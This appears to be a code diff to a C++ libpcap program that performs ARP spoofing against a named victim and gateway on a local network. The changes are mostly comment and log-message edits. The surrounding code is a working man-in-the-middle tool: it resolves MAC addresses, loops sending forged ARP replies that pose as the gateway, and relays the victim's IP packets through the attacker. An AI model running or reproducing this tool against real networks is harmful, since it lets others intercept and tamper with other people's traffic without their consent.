@@ -91,6 +91,9 @@ int arp_packet(int op) {
 
 int send_request(pcap_t *pcd, char my_mac[6], char *my_ip, char *victim_ip) {
 
+    // 1. (REQ) Attacker -> Victim
+    // 3. (REQ) Attacker -> Gateway
+
     memcpy(eth_arp_hdr->h_source, my_mac, 6);
     memset(eth_arp_hdr->h_dest, 0xff, 6);
 
@@ -104,8 +107,7 @@ int send_request(pcap_t *pcd, char my_mac[6], char *my_ip, char *victim_ip) {
     if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
         cout << "Error arp request ( For get victim mac )" << endl;
         return -1;
-    }
-    else cout << endl << "Send arp request for get victim mac" << endl;
+    } else cout << endl << "(REQ) Send arp request" << endl;
 
     return 0;
 }
@@ -116,8 +118,8 @@ int res;
 
 int get_mac_and_ip(pcap_t *pcd, char *dev, char my_mac[6], char *my_ip, char *sender_ip, char get_ip[4], char get_mac[6]) {
 
-    // Victim <- Attacker
-    // Attacker -> Gateway
+    // 2. (RES) Victim -> Attacker ( Get victim mac )
+    // 4. (RES) Gateway -> Attacker ( Get gateway mac )
 
     while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) {
            if(res == 0) continue;
@@ -128,7 +130,7 @@ int get_mac_and_ip(pcap_t *pcd, char *dev, char my_mac[6], char *my_ip, char *se
 
            eth_arp_hdr = (struct ether_arp_hdr*)packet;
 
-           if(eth_arp_hdr->h_proto == htons(ETHERTYPE_ARP)  // Come reply packet
+           if(eth_arp_hdr->h_proto == htons(ETHERTYPE_ARP)  // When come reply packet
                    && memcmp(eth_arp_hdr->h_dest, my_mac, 6)==0
                    && memcmp(eth_arp_hdr->__ar_sip, sender_ip, 4)==0
                    && memcmp(eth_arp_hdr->__ar_tha, my_mac, 6)==0
@@ -138,7 +140,7 @@ int get_mac_and_ip(pcap_t *pcd, char *dev, char my_mac[6], char *my_ip, char *se
                memcpy(get_mac, eth_arp_hdr->h_source, 6);
                change_ip((char*)eth_arp_hdr->__ar_sip, get_ip);
 
-               cout << "Get ip and mac." << endl;
+               cout << "(RES) Get ip and mac for packet response." << endl;
                break;
            }
        }
@@ -148,11 +150,13 @@ int get_mac_and_ip(pcap_t *pcd, char *dev, char my_mac[6], char *my_ip, char *se
 
 int arp_infection_packet(char *dev, pcap_t *pcd, char victim_mac[6], char my_mac[6], char *gateway_ip, char *victim_ip, int time) {
 
-    // Attacker -> Victim
+        // Attacker ( like gateway ) -> Victim
+    // because come ARP broadcast periodically.
+
         memcpy(eth_arp_hdr->h_dest, victim_mac, 6);
         memcpy(eth_arp_hdr->h_source, my_mac, 6);
 
-        arp_packet(0x0002);
+        arp_packet(0x0002); // reply
 
         memcpy(eth_arp_hdr->__ar_sha, my_mac, 6);
         memcpy(eth_arp_hdr->__ar_sip, gateway_ip, 4);
@@ -175,7 +179,7 @@ struct ethhdr *ep;
 
 int ip_relay_packet(pcap_t *pcd, char *dev, char my_mac[6], char victim_mac[6], char *gateway_mac, char *victim_ip, char *gateway_ip) {
 
-    // Victim -> Attacker -> Gateway
+    // (IP:Connect) Victim -> Attacker -> Gateway
 
         while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) {
 
@@ -198,7 +202,7 @@ int ip_relay_packet(pcap_t *pcd, char *dev, char my_mac[6], char victim_mac[6], 
                     cout << "Error relay packet" << endl;
                     return -1;
                 }
-                else cout << "Send IP relay packet" << endl;
+                else cout << "<< Send IP relay packet" << endl;
             }
 
             // Recovery
@@ -225,9 +229,16 @@ int main(int argc, char *argv[]) {
     eth_arp_hdr = new ether_arp_hdr;
     char errbuf[PCAP_ERRBUF_SIZE];
 
-    char *dev = argv[1];
-    cout << endl << "Device : " << dev << endl << endl;
 
+    // Check
+    cout << "* Input value *" << endl
+         << "  1 Device : " << argv[1] << endl
+         << "  2 GatewayIP : " << hex << argv[2] << endl
+         << "  3 VictimIP : " << argv[3] << endl
+         << "  4 AttackerIP : " << argv[4] << endl;
+
+
+    char *dev = argv[1];
     char my_mac[6];
     get_my_mac(dev, my_mac);
 
@@ -240,6 +251,7 @@ int main(int argc, char *argv[]) {
     char *victim_ip = argv[3];
     change_ip(victim_ip, victim_ip);
 
+
     // Will get
     char get_victim_mac[6];
     char get_gateway_mac[6];
@@ -251,16 +263,17 @@ int main(int argc, char *argv[]) {
         return -1;
     }
 
-    send_request(pcd, my_mac, my_ip, victim_ip); //
-    get_mac_and_ip(pcd, dev, my_mac, my_ip, victim_ip, get_gateway_ip, get_victim_mac); // Get victim mac
-
-    cout << "*** Get victim mac" << endl;
+    // Get victim mac
+    send_request(pcd, my_mac, my_ip, victim_ip); // broadcast
+    get_mac_and_ip(pcd, dev, my_mac, my_ip, victim_ip, get_gateway_ip, get_victim_mac);
+    cout << "   == Get victim mac" << endl;
     sleep(1);
 
+    // Get gateway mac
     send_request(pcd, my_mac, my_ip, gateway_ip);
-    get_mac_and_ip(pcd, dev, my_mac, my_ip, gateway_ip, get_gateway_ip, get_gateway_mac); // Get gateway mac
+    get_mac_and_ip(pcd, dev, my_mac, my_ip, gateway_ip, get_gateway_ip, get_gateway_mac);
     sleep(1);
-    cout << "*** Get gateway mac" << endl << endl << "*** *** *** Start" << endl;
+    cout << "   == Get gateway mac" << endl << endl << "*** ARP Spoofing Start ***" << endl;
 
     while(1) {
     thread t1(arp_infection_packet, dev, pcd, get_victim_mac, my_mac, gateway_ip, victim_ip, 1);
@@ -269,5 +282,6 @@ int main(int argc, char *argv[]) {
     t2.join();
     }
 }
+
 
 
